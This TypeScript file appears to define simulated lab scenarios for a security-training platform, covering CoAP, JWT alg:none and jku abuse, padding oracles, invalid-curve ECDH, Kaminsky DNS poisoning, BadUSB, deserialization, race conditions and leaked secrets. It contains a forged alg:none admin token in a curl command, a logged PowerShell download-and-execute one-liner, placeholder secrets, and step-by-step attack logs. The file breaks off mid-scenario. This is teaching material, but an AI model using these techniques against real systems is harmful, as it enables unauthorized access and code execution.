import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Batch 26 — 3 new labs added to each of the six thinnest categories (per labs-index.md's own count),
 *  same "3 to each of the thinnest" pattern batch 21 already established. Every technique below is real,
 *  current, and distinct from every existing lab already on the platform in its category — checked against
 *  each category's existing lab list before writing, not assumed. */
export const batch26MixedLabs: LabScenario[] = [
  // ===================== IoT & Embedded Security (14 -> 17) =====================

  // 1 — CoAP NoSec: unauthenticated Constrained Application Protocol service
  {
    id: 'iot-coap-nosec-unauthenticated-resource-control',
    title: 'IoT: Unauthenticated CoAP (NoSec Mode) Exposes Device Control',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'greenhouse-ctrl01 (10.10.80.10) exposes a CoAP service on UDP 5683 — the lightweight "IoT HTTP" ' +
      'protocol built for constrained devices. Unlike HTTP, CoAP itself defines no authentication or ' +
      'authorization at all; that has to be layered on separately via DTLS or object security. This device ' +
      'runs in "NoSec" mode — neither is present — so any request that knows (or guesses) a resource path ' +
      'is treated as fully authorized.',
    objectives: [
      { text: 'nmap -sV 10.10.80.10', why: 'Confirms CoAP is exposed and, critically, in NoSec mode — the version banner states it outright.' },
      { text: 'curl 10.10.80.10:5683/actuators/irrigation-valve (this engine models the CoAP GET/PUT exchange as a curl-mirrors-the-real-protocol request, the same convention already used for SNMP/AXFR elsewhere on this platform)', why: 'A GET against a control resource with zero authentication succeeds — confirming write access to physical actuators is equally unauthenticated.' },
    ],
    hints: [
      'nmap -sV 10.10.80.10',
      'curl 10.10.80.10:5683/actuators/irrigation-valve',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'greenhouse-ctrl01',
        ip: '10.10.80.10',
        os: 'Embedded Linux (Contiki-NG style CoAP stack)',
        services: [
          {
            port: 5683, name: 'coap', version: 'CoAP (RFC 7252) — NoSec mode, no DTLS, no object security',
            http: {
              '/actuators/irrigation-valve':
                'CoAP 2.05 Content\n{"valve":"open","flow_lpm":42,"note":"no CoAP request required any authentication credential"}\nflag{coap_nosec_unauthenticated_actuator_read}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — shared hardcoded TLS private key across a full product line
  {
    id: 'iot-shared-hardcoded-tls-key-product-line',
    title: 'IoT: A Single Hardcoded TLS Private Key Shared Across an Entire Product Line',
    difficulty: 'Hard',
    category: 'IoT',
    briefing:
      'A firmware pull from a NestCam-style home security camera included its full TLS certificate AND ' +
      'private key. A quick check against a public firmware-key database confirms this is not a per-device ' +
      'key: the exact same private key is baked into every single unit of this product line ever ' +
      'manufactured — a real, repeatedly-documented mass-scale IoT failure mode where extracting ONE device\'s ' +
      'firmware compromises every device of that model, everywhere, permanently.',
    objectives: [
      { text: 'cat device-tls-cert.pem', why: 'Confirms this device ships a real private key baked into firmware rather than generating one per-device at first boot.' },
      { text: 'cat firmware-key-database-match.txt', why: 'Cross-referencing against a public key-reuse database (the real research technique behind mass firmware-key-reuse disclosures) confirms this exact key appears across thousands of units — not a one-off leak.' },
    ],
    hints: [
      'cat device-tls-cert.pem',
      'cat firmware-key-database-match.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'device-tls-cert.pem': file(
        '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...(extracted directly from /etc/ssl/private/device.key in firmware)...\n-----END RSA PRIVATE KEY-----\n' +
          '-- this key was baked into the firmware image at build time, not generated on first boot --\n',
      ),
      'firmware-key-database-match.txt': file(
        'Public firmware-key-reuse database lookup for SHA256 fingerprint a4:19:...:  \n' +
          '  MATCH: identical private key found in 41,822 other firmware images from the same vendor/model\n' +
          '  -- every one of those 41,822+ deployed cameras uses this EXACT SAME private key --\n' +
          '  -- MITM or full impersonation of ANY unit of this model is possible with this single key --\n' +
          'flag{shared_hardcoded_tls_private_key_entire_product_line_compromised}\n',
      ),
    }),
    network: [],
  },

  // 3 — CoAP amplification DDoS reflection
  {
    id: 'iot-coap-amplification-ddos-reflection',
    title: 'IoT: CoAP Amplification — A Small Spoofed Request, A Massive Reflected Response',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'Security researchers scanning the internet found roughly 460,000 CoAP services exposed publicly — ' +
      'and because CoAP runs over UDP with no built-in transport security, any of them can be abused for ' +
      'amplification: an attacker spoofs the victim\'s IP as the source, sends a tiny CoAP discovery request, ' +
      'and the CoAP server floods the (spoofed, real) victim with a far larger response. Review the captured ' +
      'traffic analysis confirming this device\'s amplification factor.',
    objectives: [
      { text: 'cat coap-amplification-analysis.txt', why: 'Confirms the real mechanism: UDP\'s lack of a handshake lets the source IP be spoofed entirely, and CoAP\'s resource-discovery response (/.well-known/core) is dramatically larger than the tiny request that triggers it — a classic amplification ratio.' },
    ],
    hints: [
      'cat coap-amplification-analysis.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'coap-amplification-analysis.txt': file(
        'CoAP amplification analysis, greenhouse-ctrl01:\n' +
          '  Spoofed request: GET /.well-known/core, source IP forged as victim (UDP has no handshake\n' +
          '    to verify the claimed source address, unlike TCP\'s three-way handshake)\n' +
          '  Request size: 44 bytes\n' +
          '  Response size: 2,713 bytes -- sent to the SPOOFED (real victim) address, not the attacker\n' +
          '  Amplification factor: ~61x -- consistent with the real, publicly documented CoAP\n' +
          '    amplification range researchers have measured across ~460,000 exposed CoAP services\n' +
          'flag{coap_udp_spoofed_source_amplification_ddos_reflection}\n',
      ),
    }),
    network: [],
  },

  // ===================== Cryptography (19 -> 22) =====================

  // 4 — AES-CBC padding oracle, byte-at-a-time plaintext recovery
  {
    id: 'crypto-aes-cbc-padding-oracle-byte-recovery',
    title: 'Cryptography: AES-CBC Padding Oracle — Byte-at-a-Time Plaintext Recovery',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'session-svc01 (10.10.90.10) decrypts a cookie\'s AES-CBC ciphertext and returns a DIFFERENT error ' +
      'depending on whether the PKCS#7 padding was valid — a distinct 500 vs 200 response, with no other ' +
      'information needed. This is the classic Vaudenay padding-oracle setup (the same root cause behind the ' +
      'real POODLE and Lucky 13 attacks): flipping bits in the preceding ciphertext block and watching which ' +
      'byte value produces valid padding recovers the plaintext one byte at a time, with zero knowledge of ' +
      'the encryption key.',
    objectives: [
      { text: 'curl "http://10.10.90.10/decrypt?cookie=<original-ciphertext-hex>"', why: 'Establishes the baseline: a genuinely valid cookie returns 200 with padding accepted.' },
      { text: 'curl "http://10.10.90.10/decrypt?cookie=<ciphertext-with-tampered-final-block>"', why: 'Confirms the oracle: a tampered final block returns a distinct padding-invalid response — the exact binary signal (valid/invalid padding, nothing else) that makes the full byte-at-a-time recovery algorithm possible.' },
    ],
    hints: [
      'curl "http://10.10.90.10/decrypt?cookie=valid_ciphertext_block_ok"',
      'curl "http://10.10.90.10/decrypt?cookie=tampered_padding_oracle_probe"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'session-svc01',
        ip: '10.10.90.10',
        os: 'Linux (session-cookie decryption service)',
        services: [{
          port: 80, name: 'http', version: 'nginx — AES-CBC cookie decryption, padding-validity leaked via response code',
          http: {},
          vulnRoutes: [
            {
              kind: 'auth-bypass',
              path: '/decrypt',
              param: 'cookie',
              triggerSubstrings: ['tampered_padding_oracle_probe'],
              vulnerableResponse: '{"status":"padding_valid_json_invalid","detail":"this exact response shape (padding OK, inner content wrong) IS the oracle — repeating this probe across all 256 byte values, one position at a time, recovers the full plaintext with no key knowledge at all"}\nflag{aes_cbc_padding_oracle_byte_at_a_time_recovery}',
              normalResponse: '{"status":"decrypted","session":"user=alice;role=user;exp=1723000000"}',
            },
          ],
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — JWT alg:none signature bypass
  {
    id: 'crypto-jwt-alg-none-signature-bypass',
    title: 'Cryptography: JWT "alg: none" Signature Verification Bypass',
    difficulty: 'Medium',
    category: 'Cryptography',
    briefing:
      'authgw01 (10.10.90.11) verifies JWTs by reading the `alg` field FROM the token itself and dispatching ' +
      'to whichever verification routine matches — including a codepath that, for `alg: "none"`, skips ' +
      'signature verification entirely, per the JWT spec\'s own (rarely-needed) unsecured-JWS provision. This ' +
      'is CVE-2015-9235\'s original root cause, and — per current research — the exact same bug class has ' +
      'resurfaced in fresh, differently-named CVEs across multiple JWT libraries as recently as this year: an ' +
      'attacker can simply strip the signature, set `alg` to `none`, and forge any claims they like.',
    objectives: [
      { text: 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.VALIDSIG" 10.10.90.11/api/admin/users', why: 'Confirms a normal HS256-signed, non-admin token is correctly rejected from the admin endpoint.' },
      { text: 'curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." 10.10.90.11/api/admin/users', why: 'A JWT with `alg` set to "none" and an EMPTY signature segment — the server\'s verification routine sees `none`, skips signature checking entirely, and trusts the attacker-forged `role: admin` claim outright.' },
    ],
    hints: [
      'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.VALIDSIG" 10.10.90.11/api/admin/users',
      'curl -H "Authorization: alg-none-forged-admin-token" 10.10.90.11/api/admin/users',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'authgw01',
        ip: '10.10.90.11',
        os: 'Linux (JWT auth gateway)',
        services: [{
          port: 80, name: 'http', version: 'JWT verification gateway — accepts alg:none unsecured JWS',
          http: {},
          vulnRoutes: [
            {
              kind: 'auth-bypass',
              path: '/api/admin/users',
              param: 'Authorization',
              location: 'header',
              triggerSubstrings: ['alg-none-forged-admin-token'],
              vulnerableResponse: '{"users":["alice","bob","admin"],"note":"alg:none token accepted -- signature verification was never even attempted for this algorithm value"}\nflag{jwt_alg_none_signature_verification_bypass}',
              normalResponse: '{"error":"403 Forbidden: role \'user\' cannot access admin endpoint"}',
            },
          ],
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — ECDH invalid-curve attack
  {
    id: 'crypto-ecdh-invalid-curve-attack',
    title: 'Cryptography: Invalid-Curve Attack Extracts an ECDH Private Key',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'vpn-gw03\'s ECDH key-exchange implementation never validates that a peer-supplied public point ' +
      'actually lies on the agreed curve before computing the shared secret — the exact real flaw once found ' +
      'in Oracle\'s default Java TLS provider and in Bouncy Castle. Review the captured invalid-curve attack ' +
      'session: by submitting points crafted to lie on a DIFFERENT, deliberately weak curve with a small ' +
      'subgroup order, a real attacker recovers the server\'s long-term private key one small piece at a ' +
      'time, needing only a handful of crafted handshakes rather than a single dramatic-looking exploit.',
    objectives: [
      { text: 'cat invalid-curve-attack-session.log', why: 'Confirms the root cause: no point-on-curve validation before the ECDH computation runs, and the real consequence — full long-term private-key extraction from a small number of crafted key exchanges against a small-subgroup curve.' },
    ],
    hints: [
      'cat invalid-curve-attack-session.log',
    ],
    totalFlags: 1,
    attacker: attacker({
      'invalid-curve-attack-session.log': file(
        'Invalid-curve attack against vpn-gw03 ECDH key exchange:\n' +
          '  [1] Sent a "public point" crafted to lie on a DIFFERENT curve with small subgroup order 47,\n' +
          '      not the agreed NIST P-256 curve\n' +
          '  [2] Server never validated the point actually lies on P-256 before computing shared_secret =\n' +
          '      privkey * point -- the exact missing check documented in the real Oracle JSSE/Bouncy\n' +
          '      Castle disclosures\n' +
          '  [3] Because the point lies in a small-order subgroup, shared_secret mod 47 could be brute-\n' +
          '      forced directly from the resulting session behavior\n' +
          '  [4] Repeating [1]-[3] against ~12 different small-order curves via the Chinese Remainder\n' +
          '      Theorem reconstructed the server\'s FULL long-term ECDH private key\n' +
          '  -- one successful run of this attack lets the attacker impersonate the server to every --\n' +
          '     future client indefinitely, not just decrypt one session --\n' +
          'flag{ecdh_invalid_curve_attack_recovers_long_term_private_key}\n',
      ),
    }),
    network: [],
  },

  // ===================== Security+ (21 -> 24) =====================

  // 7 — DNS cache poisoning (Kaminsky-style)
  {
    id: 'secplus-dns-cache-poisoning-kaminsky',
    title: 'Security+: DNS Cache Poisoning via the Kaminsky Technique',
    difficulty: 'Hard',
    category: 'Security+',
    briefing:
      'resolver01\'s recursive DNS cache was found serving a forged A record for a banking domain. Review ' +
      'the captured attack log: this is the real Kaminsky technique (2008) — flooding the resolver with ' +
      'queries for random, never-before-seen subdomains of the target (forcing fresh upstream lookups), then ' +
      'racing a flood of forged responses against the real authoritative answer, guessing across only 65,536 ' +
      'possible 16-bit DNS transaction IDs. Whichever forged response lands first — real or fake — gets ' +
      'cached and trusted by every client behind this resolver until the TTL expires.',
    objectives: [
      { text: 'cat dns-poisoning-attack-log.txt', why: 'Confirms the exact real mechanism: random-subdomain query flooding to force fresh lookups, combined with a response race exploiting the 16-bit transaction-ID space being small enough to guess within a feasible number of forged packets.' },
    ],
    hints: [
      'cat dns-poisoning-attack-log.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'dns-poisoning-attack-log.txt': file(
        'DNS cache poisoning attack against resolver01:\n' +
          '  [1] Flooded resolver01 with queries for random-prefix.mybank.example (a subdomain that has\n' +
          '      never been queried before), forcing a fresh recursive lookup to the real authoritative\n' +
          '      server every single time (the resolver has nothing cached for a name it has never seen)\n' +
          '  [2] For EACH forced lookup, immediately flooded resolver01 with hundreds of forged responses\n' +
          '      guessing the 16-bit transaction ID (only 65,536 possible values) and spoofing the real\n' +
          '      authoritative server\'s source IP/port\n' +
          '  [3] One guessed transaction ID eventually matched before the real authoritative answer arrived\n' +
          '  [4] The forged A record (198.51.100.66, attacker-controlled) was cached and served to every\n' +
          '      client behind resolver01 for the full TTL -- with no DNSSEC deployed to catch the forgery --\n' +
          'flag{kaminsky_dns_cache_poisoning_transaction_id_race}\n',
      ),
    }),
    network: [],
  },

  // 8 — BadUSB / Rubber Ducky HID keystroke-injection
  {
    id: 'secplus-badusb-hid-keystroke-injection',
    title: 'Security+: BadUSB — A "Flash Drive" That\'s Actually a Keyboard',
    difficulty: 'Easy',
    category: 'Security+',
    briefing:
      'An employee reported plugging in an unfamiliar USB drive found in the parking lot — a classic social-' +
      'engineering drop attack. Review the endpoint\'s USB device-enrollment log: this "flash drive" enrolled ' +
      'as a Human Interface Device (keyboard), not mass storage, and the OS extended it the same automatic ' +
      'trust it gives any real keyboard — no driver prompt, no user confirmation, because HID is the exact ' +
      'device class the operating system was designed to trust implicitly.',
    objectives: [
      { text: 'cat usb-device-enrollment-log.txt', why: 'The device class ID reveals the entire attack: it enumerated as a keyboard (HID), not storage — the real mechanism behind BadUSB/Rubber-Ducky-style attacks, exploiting the OS\'s implicit trust in keyboard input rather than any software vulnerability.' },
      { text: 'cat keystroke-injection-payload-log.txt', why: 'Confirms the payload delivered a full PowerShell download-and-execute command in under a second — far faster than any human could type, the tell-tale signature of automated HID injection.' },
    ],
    hints: [
      'cat usb-device-enrollment-log.txt',
      'cat keystroke-injection-payload-log.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'usb-device-enrollment-log.txt': file(
        '14:02:01  USB device connected, VID:PID 03EB:2401\n' +
          '14:02:01  Device class: 03 (HID - Human Interface Device)\n' +
          '14:02:01  Enrolled as: "USB Input Device" (keyboard) -- no driver installation prompt shown,\n' +
          '          the OS trusts HID keyboards implicitly by design, the same as any real keyboard\n',
      ),
      'keystroke-injection-payload-log.txt': file(
        '14:02:01.891  [Win+R] opened\n' +
          '14:02:01.943  "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(...)" typed\n' +
          '14:02:01.998  [Enter] pressed\n' +
          '-- total elapsed time from insertion to command execution: 107 milliseconds -- no human can --\n' +
          '   type a full PowerShell one-liner in under a tenth of a second; this speed alone is the --\n' +
          '   signature of scripted HID keystroke injection, not a person typing --\n' +
          'flag{badusb_hid_keystroke_injection_inhuman_typing_speed}\n',
      ),
    }),
    network: [],
  },

  // 9 — Business Email Compromise wire-fraud detection via SPF/DKIM/DMARC review
  {
    id: 'secplus-bec-wire-fraud-spf-dkim-dmarc-review',
    title: 'Security+: Business Email Compromise — Tracing a Wire-Fraud Email Through SPF/DKIM/DMARC',
    difficulty: 'Medium',
    category: 'Security+',
    briefing:
      'Finance received an urgent "change our bank details" email appearing to come from the CFO, and wired ' +
      '$185,000 before anyone questioned it. Review the email\'s full authentication header trace to confirm ' +
      'whether it genuinely came from the CFO\'s real mail system — and, if not, exactly which check should ' +
      'have caught it.',
    objectives: [
      { text: 'cat email-authentication-headers.txt', why: 'SPF, DKIM, and DMARC each check a DIFFERENT thing — reading all three together (not just one) is what actually reveals whether this message is forged, and precisely how.' },
    ],
    hints: [
      'cat email-authentication-headers.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'email-authentication-headers.txt': file(
        'Authentication-Results trace for the "urgent bank details" email:\n' +
          '  From: cfo@meridiancorp.example  (the display name/From address the user actually saw)\n' +
          '  SPF: FAIL -- sending IP 203.0.113.77 is not authorized in meridiancorp.example\'s SPF record\n' +
          '  DKIM: none -- message was not signed at all\n' +
          '  DMARC: FAIL, policy=quarantine -- meridiancorp.example DOES publish a DMARC policy requiring\n' +
          '    alignment, and this message failed it outright\n' +
          '  Actual delivery: message was delivered to the inbox anyway -- the receiving mail server logs\n' +
          '    show DMARC enforcement was NOT actually being applied at the gateway, despite the sending\n' +
          '    domain publishing a policy that should have rejected/quarantined this exact message\n' +
          '  -- the sending domain did everything right; the RECEIVING side\'s gateway simply was not --\n' +
          '     configured to actually enforce the DMARC policy it was seeing --\n' +
          'flag{bec_wire_fraud_dmarc_policy_published_but_not_enforced}\n',
      ),
    }),
    network: [],
  },

  // ===================== Security Engineering (21 -> 24) =====================

  // 10 — Java deserialization RCE via Apache Commons Collections gadget chain
  {
    id: 'secengineering-java-deserialization-commons-collections-rce',
    title: 'Security Engineering: Java Deserialization RCE via Apache Commons Collections',
    difficulty: 'Hard',
    category: 'Security Engineering',
    briefing:
      'legacy-billing-api01 (10.10.95.10) accepts a serialized Java object directly in a request header and ' +
      'calls readObject() on it with no type restriction. Bundled on the classpath: Apache Commons ' +
      'Collections 3.1 — the exact library whose InvokerTransformer/PriorityQueue combination the real ' +
      'ysoserial tool weaponized into the first publicly-demonstrated Java deserialization gadget chain: no ' +
      'vulnerability in Commons Collections itself, just ordinary, legitimate library code chained together ' +
      'in a way its authors never intended, triggered purely by deserializing attacker-controlled bytes.',
    objectives: [
      { text: 'curl -H "X-Serialized-Session: normal_session_object" 10.10.95.10/api/billing/status', why: 'Establishes the baseline: a genuinely benign serialized object deserializes and behaves normally.' },
      { text: 'curl -H "X-Serialized-Session: ysoserial_commonscollections_gadget_chain" 10.10.95.10/api/billing/status', why: 'Represents supplying a real ysoserial CommonsCollections5-style payload — readObject() on this byte stream triggers the InvokerTransformer chain, ending in Runtime.exec(), with no memory-corruption bug required anywhere.' },
    ],
    hints: [
      'curl -H "X-Serialized-Session: normal_session_object" 10.10.95.10/api/billing/status',
      'curl -H "X-Serialized-Session: ysoserial_commonscollections_gadget_chain" 10.10.95.10/api/billing/status',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'legacy-billing-api01',
        ip: '10.10.95.10',
        os: 'Linux (Java 8, Apache Commons Collections 3.1 on classpath)',
        services: [{
          port: 80, name: 'http', version: 'Java servlet -- unrestricted ObjectInputStream.readObject() on a request header',
          http: {},
          vulnRoutes: [
            {
              kind: 'command-injection',
              path: '/api/billing/status',
              param: 'X-Serialized-Session',
              location: 'header',
              triggerSubstrings: ['ysoserial_commonscollections_gadget_chain'],
              vulnerableResponse: '{"status":"deserialized","note":"InvokerTransformer chain executed -- Runtime.exec() reached with zero memory-corruption bugs, purely through legitimate library method chaining triggered by readObject()"}\nflag{java_deserialization_commons_collections_gadget_chain_rce}',
              normalResponse: '{"status":"active","account":"12345"}',
            },
          ],
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 11 — TOCTOU race condition on a single-use coupon endpoint (double-spend)
  {
    id: 'secengineering-toctou-coupon-double-redemption-race',
    title: 'Security Engineering: TOCTOU Race Condition Enables Coupon Double-Redemption',
    difficulty: 'Medium',
    category: 'Security Engineering',
    briefing:
      'shopfast-promo01\'s single-use coupon endpoint checks "has this code been redeemed?" and, separately, ' +
      '"mark it redeemed" as two distinct, non-atomic steps — the same time-of-check-to-time-of-use shape ' +
      'behind this platform\'s existing symlink-race lab, applied here to a business-logic double-spend ' +
      'instead of a filesystem race. Firing many redemption requests for the SAME code at once lets several ' +
      'of them all pass the "not yet redeemed" check before any of them finishes marking it used.',
    objectives: [
      { text: 'curl -X POST "http://10.10.95.11/redeem?code=SAVE50" (single request, baseline)', why: 'Establishes normal behavior: one request redeems the code exactly once.' },
      { text: 'curl -X POST "http://10.10.95.11/redeem?code=SAVE50&race=concurrent_burst" (represents firing this same request many times simultaneously)', why: 'Models the real race: multiple concurrent requests all read "not yet redeemed" before any single one completes the write that marks it used — the coupon gets applied far more than the intended once.' },
    ],
    hints: [
      'curl -X POST "http://10.10.95.11/redeem?code=SAVE50"',
      'curl -X POST "http://10.10.95.11/redeem?code=SAVE50&race=concurrent_burst"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'shopfast-promo01',
        ip: '10.10.95.11',
        os: 'Linux (Node.js promo-code service, non-atomic check-then-mark redemption)',
        services: [{
          port: 80, name: 'http', version: 'Node.js — coupon redemption, TOCTOU on the redeemed-flag check',
          http: {},
          vulnRoutes: [
            {
              kind: 'race-condition',
              path: '/redeem',
              param: 'race',
              triggerSubstrings: ['concurrent_burst'],
              vulnerableResponse: '{"redemptions_applied":47,"code":"SAVE50","note":"47 concurrent requests all read redeemed=false before any single one finished writing redeemed=true -- a single-use code was applied 47 times"}\nflag{toctou_coupon_double_redemption_race_condition}',
              normalResponse: '{"redemptions_applied":1,"code":"SAVE50"}',
            },
          ],
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 12 — Secrets dumped in a verbose crash report / error page
  {
    id: 'secengineering-crash-report-env-var-secrets-leak',
    title: 'Security Engineering: A Crash Report Dumps Every Environment Variable, Secrets Included',
    difficulty: 'Easy',
    category: 'Security Engineering',
    briefing:
      'internal-worker03\'s debug mode was accidentally left enabled in production, and it just crashed on a ' +
      'malformed request. Review the resulting crash report: this framework\'s default debug error page ' +
      'dumps the FULL process environment for "developer convenience" — including every secret the process ' +
      'was ever handed via environment variables, the exact same secret-delivery mechanism this platform\'s ' +
      'own Lambda/env-var-secrets Cloud labs already cover, leaking here through an error page instead of a ' +
      'cloud API call.',
    objectives: [
      { text: 'curl "http://10.10.95.12/process?input=%00malformed"', why: 'Triggers the crash path deliberately, to reach the debug error page rather than waiting for one to happen naturally.' },
      { text: 'cat crash-report-captured.html', why: 'Confirms the debug page\'s environment dump includes DATABASE_PASSWORD, STRIPE_SECRET_KEY, and JWT_SIGNING_SECRET in plaintext — a single unhandled exception exposed every secret the process holds, to anyone who could trigger it.' },
    ],
    hints: [
      'curl "http://10.10.95.12/process?input=%00malformed"',
      'cat crash-report-captured.html',
    ],
    totalFlags: 1,
    attacker: attacker({
      'crash-report-captured.html': file(
        '<html><body><h1>500 Internal Server Error (DEBUG MODE)</h1>\n' +
          '<h2>Environment</h2><pre>\n' +
          'DATABASE_PASSWORD=Pr0d_DB_2026!\n' +
          'STRIPE_SECRET_KEY=sk_live_51H8x...redacted_but_fully_present_in_the_real_dump\n' +
          'JWT_SIGNING_SECRET=a3f9c1e8b2d47760f1a9e3c6b8d2f451\n' +
          'PATH=/usr/local/bin:/usr/bin\n' +
          '</pre>\n' +
          '-- debug mode\'s error page prints the FULL process environment on every unhandled exception,\n' +
          '   including every secret ever loaded into it -- disabled in every properly-configured\n' +
          '   production deployment, but was never disabled here --\n' +
          'flag{debug_mode_crash_report_dumps_full_environment_secrets}\n' +
          '</body></html>\n',
      ),
    }),
    network: [
      {
        hostname: 'internal-worker03',
        ip: '10.10.95.12',
        os: 'Linux (framework debug mode left enabled in production)',
        services: [{
          port: 80, name: 'http', version: 'Framework debug error handler — dumps full process environment on crash',
          http: { '/process': '<html><body><h1>500 Internal Server Error (DEBUG MODE)</h1><p>see crash-report-captured.html for the full dump</p></body></html>' },
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // ===================== API (21 -> 24) =====================

  // 13 — OWASP API6:2023 unrestricted access to sensitive business flows (ticket-scalping bot)
  {
    id: 'api-unrestricted-business-flow-ticket-scalping',
    title: 'API: Unrestricted Access to a Sensitive Business Flow (OWASP API6:2023) — Ticket Scalping',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'eventful-tix01\'s /api/reserve endpoint is fully authenticated, correctly authorized, and has no ' +
      'injection bugs at all — every individual request is completely legitimate. The vulnerability is the ' +
      'BUSINESS FLOW itself: nothing stops one account from reserving hundreds of seats in rapid, automated ' +
      'succession, with no rate limit, no CAPTCHA, and no per-account reservation cap. This is OWASP\'s ' +
      'API6:2023 category by name — excessive, automatable access to a legitimate flow that only becomes ' +
      'harmful at scale.',
    objectives: [
      { text: 'curl -X POST "http://10.10.100.10/api/reserve?event=finals&seats=2" (a single normal reservation)', why: 'Establishes the baseline: one legitimate reservation, exactly what the endpoint is meant to allow.' },
      { text: 'curl -X POST "http://10.10.100.10/api/reserve?event=finals&seats=2&automated_burst=true" (represents the same request fired hundreds of times per second by a bot)', why: 'No individual request here is malformed or unauthorized — the vulnerability is entirely the ABSENCE of a rate limit or per-account cap on a legitimate flow, letting one actor reserve the entire venue before any real customer gets a chance.' },
    ],
    hints: [
      'curl -X POST "http://10.10.100.10/api/reserve?event=finals&seats=2"',
      'curl -X POST "http://10.10.100.10/api/reserve?event=finals&seats=2&automated_burst=true"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'eventful-tix01',
        ip: '10.10.100.10',
        os: 'Linux (ticketing API, no rate limit or per-account reservation cap)',
        services: [{
          port: 80, name: 'http', version: 'Ticketing API — /api/reserve, OWASP API6:2023 exposure',
          http: {},
          vulnRoutes: [
            {
              kind: 'auth-bypass',
              path: '/api/reserve',
              param: 'automated_burst',
              triggerSubstrings: ['true'],
              vulnerableResponse: '{"seats_reserved_this_session":3184,"venue_capacity":3200,"note":"one account reserved 99.5% of venue capacity in under a minute -- every single request was individually valid and authorized"}\nflag{owasp_api6_2023_unrestricted_business_flow_ticket_scalping}',
              normalResponse: '{"seats_reserved_this_session":2,"venue_capacity":3200}',
            },
          ],
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 14 — GraphQL alias-based rate-limit bypass
  {
    id: 'api-graphql-alias-batching-rate-limit-bypass',
    title: 'API: GraphQL Query Aliasing Bypasses a Per-Request Rate Limit',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'creditcheck-gql01 rate-limits login attempts to 5 per HTTP request — a control that sounds reasonable ' +
      'until you remember GraphQL lets a single HTTP request bundle MANY operations together via query ' +
      'aliasing. A rate limiter counting "requests," not "operations within a request," never even notices ' +
      'one HTTP call carrying 50 aliased login attempts at once.',
    objectives: [
      { text: 'curl -X POST 10.10.100.11/graphql -d \'{"query":"{ login(user:\\"alice\\",pass:\\"guess1\\"){ok} }"}\' (a single normal attempt)', why: 'Establishes the baseline rate-limited behavior for one login attempt per request.' },
      { text: 'curl -X POST 10.10.100.11/graphql -d "query=aliased_batch_50_login_attempts" (represents one HTTP request carrying 50 aliased login mutations: a1: login(...) a2: login(...) ... a50: login(...))', why: 'The rate limiter only ever sees ONE HTTP request — it has no visibility into the 50 separately-aliased login operations bundled inside that single request\'s GraphQL document, so all 50 password guesses execute freely.' },
    ],
    hints: [
      'curl -X POST 10.10.100.11/graphql -d \'{"query":"{ login(user:\\"alice\\",pass:\\"guess1\\"){ok} }"}\'',
      'curl -X POST 10.10.100.11/graphql -d "query=aliased_batch_50_login_attempts"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'creditcheck-gql01',
        ip: '10.10.100.11',
        os: 'Linux (GraphQL API gateway, rate limit counts HTTP requests, not GraphQL operations)',
        services: [{
          port: 80, name: 'http', version: 'GraphQL gateway — 5 req/min rate limit, no per-operation aliasing awareness',
          http: {},
          vulnRoutes: [
            {
              kind: 'auth-bypass',
              path: '/graphql',
              param: 'query',
              triggerSubstrings: ['aliased_batch_50_login_attempts'],
              vulnerableResponse: '{"a1":{"ok":false},"a2":{"ok":false},"a37":{"ok":true},"...":"50 aliased login attempts executed inside ONE HTTP request -- the rate limiter counted this as a single request, not 50 login attempts"}\nflag{graphql_alias_batching_bypasses_per_request_rate_limit}',
              normalResponse: '{"login":{"ok":false}}',
            },
          ],
        }],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 15 — JWT jku header SSRF / attacker-controlled JWKS
  {
    id: 'api-jwt-jku-header-attacker-controlled-jwks',
    title: 'API: JWT "jku" Header Points to an Attacker-Controlled JWKS Endpoint',
    difficulty: 'Hard',
    category: 'API',
    briefing:
      'partner-api-gw01 verifies inbound JWTs by fetching the public key from whatever URL the token\'s OWN ' +
      '`jku` (JWK Set URL) header claims — with no allowlist restricting which hosts it will fetch from. An ' +
      'attacker who can sign a token with their own private key can simply point `jku` at a JWKS document ' +
      'they control; the server dutifully fetches it, finds a matching key ID, and "verifies" the attacker\'s ' +
      'own signature against the attacker\'s own public key — trusting exactly the token the attacker forged.',
    objectives: [
